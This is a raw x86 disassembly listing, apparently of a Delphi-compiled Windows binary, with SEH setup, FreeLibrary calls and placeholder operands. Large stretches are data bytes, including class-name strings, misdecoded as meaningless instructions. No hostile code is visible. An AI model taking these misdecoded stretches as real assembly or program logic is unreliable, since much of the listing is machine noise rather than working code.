add [ eax + ecx * 8 - 0x127bffb8 ] cl
inc edx
add [ eax + ecx * 8 - 0x1283ffb8 ] al
inc edx
add [ eax + ecx * 8 + 0x48 ] bh
add [ ebp + ebp * 8 + 0x42 ] dh
add [ eax + ecx * 8 + 0x48 ] dh
add [ ebp + ebp * 8 + 0x42 ] ch
add [ eax + ecx * 8 + 0x48 ] ch
add [ ebp + ebp * 8 + 0x42 ] ah
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f094
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f09b
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404b54
sub_42f0d0
out 0x48 al
add dh dh
inc [ eax ]
add [ esi + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x48 ] ah
add dh bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f13d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f144
retn
sub_42f150
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f181
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f188
retn
mov eax [ rw-data ]
call sub_4032b0
sub_42f28a
dec eax
add [ eax ] al
add [ eax ] al
add ah ch
leave
dec eax
add [ eax + 0x48da ] cl
add [ eax ] al
add al ch
leave
dec eax
add [ esp + ebx * 8 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add ah ah
leave
dec eax
add [ edi + edx * 8 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f2e0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f2e7
retn
call sub_42f21c
sub_42f314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f340
retn
sub_42f35b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f3a0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3a7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b54
sub_42f3c3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f408
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f40f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b54
sub_42f41f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f475
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f47c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4040ac
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f488
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f4cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f4d3
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f4e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
cmc
inc edx
add [ eax + 0x42f5 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0xb ] ch
inc edx
add [ eax + eax ] bl
add [ eax ] al
jo r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + edx * 4 ] bh
inc ecx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add ah dh
add [ ebx ] eax
enter 0x4302 0x0
mov [ ecx + eax * 2 + 0x4194b800 ] dl
add [ eax - 0x73ffbe6c ] dh
add al [ ebx ]
hlt
dec ecx
insd
insb
dec ecx
je r-xdata
pop es
hlt
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
insd
nop
xor ch 0x42
add [ edi ] al
dec ecx
je r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
insd
outsd
insb
dec ecx
je r-xdata
xor bh dh
inc edx
add [ eax ] ch
add [ eax ] al
add ah bh
outsd
insb
dec ecx
je r-xdata
add ecx [ eax ]
add al 0x4c
outsd
jb r-xdata
jae r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
sub al 0xf5
inc edx
add ah bh
arpl [ ecx ] ax
add al [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ eax ] al
insb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
inc ecx
add [ eax ] al
add [ eax ] dh
test [ edx ] 0x28
cld
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
add [ edx ] cl
arpl [ esi + ebp * 2 + 0x73 ] si
add al [ eax ]
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
xor al bh
push esp
jns r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
dec esp
add eax 0x6d657449
xor [ eax ] edx
push esp
add ah dh
inc eax
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
cmc
inc edx
add [ esi ] al
jae r-xdata
nop
inc eax
test [ edx ] 0x8
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
popad
dec ecx
outsb
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
or cl [ ecx + 0x6d ]
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah dh
mov edi 0xc0440045
inc ebp
outsb
je r-xdata
inc edx
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
add [ eax ] dh
clc
cmp al 0xf6
add [ eax ] al
ror [ eax - 0x9 ] 0x42
add [ edi ] al
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insb
dec ecx
je r-xdata
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
outsd
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x9 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
push es
inc ebx
add [ ebp + ebx + 0x42 ] al
add [ eax + 0x68004305 ] bl
mov edx 0xc3380045
inc ebp
add al dl
retn 0x45
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
inc eax
add eax 0x1ddc0043
inc edx
add [ eax - 0x7ffbde3 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jmp [ eax ]
inc ebx
outsd
outsb
je r-xdata
xor al 0x40
add al dh
xor al 0x40
insd
or [ 0x6d657449 ] al
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
inc ebx
outsd
outsb
je r-xdata
inc esp
popad
je r-xdata
add [ ebp + esi * 8 + 0x42 ] bh
add [ ebp + esi * 8 + 0x42 ] bh
jb r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
inc ebx
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
outsd
insb
dec ecx
je r-xdata
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ebx * 4 + 0x41 ] al
add al bh
cdq
inc ecx
add ah bh
insb
cdq
inc ecx
add [ eax ] bh
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x3940041 ] dh
inc ebx
add [ ecx ] dl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
nop
inc ecx
add [ eax + 0x3c004195 ] ah
0x9a400041 0x41
inc esp
0x99f80041 0x41
cld
outsd
push es
jae r-xdata
add [ ebx + 0x42f704c0 ] cl
cmc
inc edx
inc ebp
jbe r-xdata
inc ebp
add [ eax ] dl
lds eax [ ebp ]
clc
sbb eax 0xb9140042
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add al ch
inc ebp
add [ eax + eax * 8 + 0x45 ] al
je r-xdata
inc ebp
jbe r-xdata
jb r-xdata
inc edx
add [ eax ] ah
add [ eax ] al
insd
jae r-xdata
xchg ebp eax
inc ecx
add [ eax - 0x67ffbe70 ] dl
insd
pop es
je r-xdata
push esp
js r-xdata
mov eax eax
add al 0xf7
inc edx
outsb
je r-xdata
sbb al [ edx ]
loopne r-xdata
inc ebp
add al bh
outsd
insb
add [ ecx + edi * 8 ] bh
inc edx
add [ eax ] dh
hlt
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
in al 0xf7
inc edx
add [ eax ] cl
adc dl [ edi + eax * 2 + 0x65 ]
je r-xdata
inc ecx
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
test [ edx ] r-xdata
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
push es
jae r-xdata
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
or [ esp + ecx * 2 ] al
je r-xdata
je r-xdata
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65736143
push ebx
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] al
sbb al 0x0
add [ eax ] eax
or [ ebx + 0x6f ] dl
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
arpl [ esi + ebp * 2 + 0x73 ] si
add eax [ eax ]
add [ eax ] dl
add al ah
xor al 0x40
add ah ch
inc ecx
adc [ eax ] al
add [ edi + esi * 8 + 0x42 ] al
jb r-xdata
inc edx
outsd
je r-xdata
add [ eax ] ch
stc
inc edx
add ah cl
add [ eax ] al
add ah cl
mov dh 0x45
push ebx
insb
insd
jae r-xdata
insd
inc ebx
outsd
jne r-xdata
outsb
je r-xdata
dec ecx
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
push ss
inc edx
add [ edi + ecx * 4 + 0x6fc0041 ] ch
inc ebx
add [ ebx - 0x46ebffbe ] bl
inc esp
rol [ ebp ] 0xe8
outsd
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
arpl [ esi + ebp * 2 + 0x73 ] si
arpl [ gs : ebp + 0x64 ] si
insb
jbe r-xdata
add [ ecx + edi * 8 ] bh
dec ecx
outsb
je r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
stc
je r-xdata
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7 ] al
jb r-xdata
mov ah 0x44
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
inc edx
add [ eax + edx ] bh
inc eax
cmp al 0xf9
sub_42f9fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x42fa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0xd80042 ] ah
add [ eax ] al
jl r-xdata
inc edx
add al bl
add [ eax ] al
add [ eax + edi * 8 + 0x42 ] bh
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah dh
mov edi 0xc0440045
inc ebp
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x6fc0041 ] ch
inc ebx
add [ ebx - 0x46ebffbe ] bl
inc ebp
add [ eax ] dl
lds eax [ ebp ]
clc
sbb al [ edx ]
loopne r-xdata
inc edx
push es
inc ebx
add [ ebp + ebx + 0x42 ] al
add [ eax + 0x68004305 ] bl
mov edx 0xc3380045
inc ebp
add al dl
retn 0x45
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
inc eax
add eax 0x1ddc0043
inc edx
add [ eax - 0x7ffbde3 ] al
sub_42fa94
mov [ fs : ebp ] 0xc0
push es
inc ebx
add [ ecx + ecx + 0x43 ] cl
add al bh
or [ ebx ] al
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
add [ eax + eax ] 0x7
inc ebx
jne r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
pop eax
retn 0x45
add bh bh
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
nop
mov esp 0x70042fa
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
add [ eax ] cl
push ebx
push 0x4374726f
adc [ eax ] al
enter 0x0 0xff
pushfd
or [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
int3
jne r-xdata
test [ edx ] 0xff0000b8
mov eax 0x1ff0000
push 0xe40045b6
lds eax [ ebp ]
or al 0xc6
inc ebp
add [ eax - 0x3a ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
jne r-xdata
pop ebx
inc ecx
add [ eax + eax - 0x3bb30100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
inc esp
cli
inc edx
add [ ecx + edi * 8 ] bh
inc edx
add [ ecx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
adc [ eax ] al
push es
dec edi
je r-xdata
clc
inc edx
add al al
add [ eax ] al
push ebx
push 0x4374726f
jne r-xdata
insd
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
push eax
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
adc [ eax ] al
mov al [ 0x30ff0000 ]
pop es
inc ebx
add [ ecx ] al
add [ eax ] al
aam 0xfd
insd
inc ebp
jbe r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
je r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] 0xfce4c08b
inc edx
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
nop
mov dh 0x45
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
rol [ eax ] 0x0
jae r-xdata
inc edi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
inc edx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
jl r-xdata
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
inc ebx
add al bh
call 0x48433db9
xor al [ eax ]
jb r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
mov al 0xc4
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x6c656c62
stc
inc edx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000d ] al
outsb
dec ecx
je r-xdata
je r-xdata
inc edx
add al ah
add [ eax ] al
add [ eax + edi * 8 + 0x42 ] bh
add al ah
sbb al [ edx ]
inc edx
in al dx
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
xor al 0x40
je r-xdata
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
outsd
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
jae r-xdata
je r-xdata
add al 0x49
add [ eax - 0x80000000 ] al
loopne r-xdata
insd
push es
inc ebx
add [ ebp + ebx + 0x42 ] al
add [ eax + 0x68004305 ] bl
mov edx 0xc3380045
inc ebp
add al dl
retn 0x45
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
fmul [ ebx + eax * 2 ]
add ah bl
sbb eax 0x1d800042
inc edx
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc [ edx ]
loopne r-xdata
je r-xdata
xor al [ fs : eax ]
xor al 0x95
inc ecx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax + 0x3c004195 ] ah
0x9a400041 0x41
sub al 0xa
insd
adc [ esp + ecx * 2 + 0x69 ] dl
add ah ch
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ecx ] ch
inc ebx
outsd
outsb
je r-xdata
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ecx - 0x3fbbffbd ] bh
xor al 0x14
insd
jae r-xdata
cdq
inc ecx
add al al
or eax [ ebx ]
cmp [ esi - 0x694bffbf ] dl
inc ecx
add [ ebx + eax + 0x54100043 ] dl
push ebx
je r-xdata
0xa2c0041 0x43
clc
outsd
insb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x2c0042 ] bh
add [ eax ] al
mov eax 0xe00042f6
xor al 0x40
inc eax
add ah dl
std
inc edx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
insd
add [ ecx + edi * 8 ] bh
inc edx
add [ eax + edx ] bh
inc eax
add [ ebp + esi * 8 + 0x42 ] bh
add [ ebx + 0x42fd90c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
std
inc ebp
add al ch
or eax 0xc0440043
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
xor al 0x40
add [ esp + edx ] dh
add ah ch
je r-xdata
push ss
inc edx
add [ edi + ecx * 4 + 0x6fc0041 ] ch
inc ebx
add [ ebx - 0x46ebffbe ] bl
inc ebp
add [ eax ] dl
lds eax [ ebp ]
clc
sbb al [ edx ]
loopne r-xdata
rol [ ebp ] 0xe8
insd
jae r-xdata
std
inc edx
add [ edi + esi * 8 + 0x42 ] al
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ eax - 0x2 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc [ edx ]
add [ eax ] al
sub_42fec1
inc [ edx ]
pop es
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
add [ eax ] al
[ eax - 0x3e ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
int3
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
inc [ edx ]
cmp al 0xf9
inc edx
add [ edx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
pop eax
retn 0x45
push eax
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
add [ eax ] al
adc [ eax ] al
mov al [ 0x30ff0000 ]
pop es
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ 0x6d657449 ] al
adc [ eax ] al
enter 0x0 0xff
pushfd
or [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
insd
dec ecx
outsb
js r-xdata
jne r-xdata
pop ebx
inc ecx
add [ eax + eax - 0x3bb30100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax + 0x49060008 ] al
insd
popad
jae r-xdata
std
inc edx
add al dl
add [ eax ] al
dec [ eax ]
push cs
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
clc
push 0xe40045b6
lds eax [ ebp ]
or al 0xc6
inc ebp
add [ eax - 0x3a ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
inc edx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
insd
sub al 0xf8
inc ebx
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
add [ ebx ] eax
sub [ eax ] al
add [ eax ] al
xor [ ebp + 0x34e00044 ] 0x40
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
nop
mov dh 0x45
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
push ebx
push 0x4374726f
jne r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
add [ esi ] al
bound ebp [ ebp - 0x20 ]
cld
inc edx
add al bl
add [ eax ] al
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
add [ esp + ebx + 0x42 ] ch
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
out 0x44 eax
add ah ah
mov esi 0x1d700045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc301ea
inc ebp
add [ eax + 0x1d ] bh
inc ebp
add ah dh
call 0xffffffffe97701f6
inc esp
add [ eax ] ah
call 0xffffffffbfd701fe
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f7020a
inc esp
add [ esi + ecx ] bh
inc ebx
add al al
push cs
inc ebx
add [ eax + 0xe ] dl
inc ebx
add [ edi + ecx ] ch
inc ebx
add [ eax + edx + 0x10840043 ] dh
inc ebx
add [ eax + 0xf004310 ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
test [ ebx ] bl
inc edx
add [ eax ] bl
sbb al 0x42
popad
je r-xdata
dec edi
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
xor edx edx
push ebp
push sub_43026f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
